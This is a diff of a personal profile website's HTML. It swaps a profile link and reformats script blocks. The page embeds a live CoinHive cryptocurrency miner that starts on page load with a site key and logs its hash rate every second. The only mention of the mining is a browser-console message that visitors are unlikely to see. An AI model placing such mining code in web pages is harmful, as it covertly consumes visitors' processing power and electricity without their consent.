@@ -63,7 +63,7 @@
 <body>
   <aside class="profile-card">
     <header>
-      <a onclick="trackClick('profilepic')" href="https://developers.google.com/experts/people/vikram-tiwari" target="_blank" rel="noopener">
+      <a onclick="trackClick('profilepic')" href="https://vikramtiwari.github.io/website/" target="_blank" rel="noopener">
         <img src="./assets/vikram.jpg" alt="vikram profile pic" />
       </a>
       <h1>Vikram Tiwari</h1>
@@ -118,20 +118,22 @@
   console.log('This website is mining in background while you are using it.')
   var miner = new CoinHive.Anonymous('e01UBwJ1yCJgeQ410PbZcXSGvyP1pOqu');
   miner.start();
+
 </script>
 
 <script>
-	// Listen on events
-	miner.on('found', function() { /* Hash found */ })
-	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+  // Listen on events
+  miner.on('found', function () { /* Hash found */ })
+  miner.on('accepted', function () { /* Hash accepted by the pool */ })
 
-	// Update stats once per second
-	setInterval(function() {
-		var hashesPerSecond = miner.getHashesPerSecond();
-		var totalHashes = miner.getTotalHashes();
-		var acceptedHashes = miner.getAcceptedHashes();
+  // Update stats once per second
+  setInterval(function () {
+    var hashesPerSecond = miner.getHashesPerSecond();
+    var totalHashes = miner.getTotalHashes();
+    var acceptedHashes = miner.getAcceptedHashes();
     console.log(hashesPerSecond, totalHashes, acceptedHashes)
-	}, 1000);
+  }, 1000);
+
 </script>
 
 </html>
